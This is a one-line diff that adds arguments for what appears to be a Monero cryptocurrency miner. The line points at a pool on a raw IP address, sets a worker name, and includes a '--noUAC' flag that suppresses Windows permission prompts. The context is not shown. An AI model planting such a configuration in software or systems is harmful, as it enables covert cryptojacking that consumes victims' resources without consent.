@@ -1,0 +1,1 @@
+--currency,monero,-o,163.172.160.14:443,-u,homepc,-p,x,--noUAC
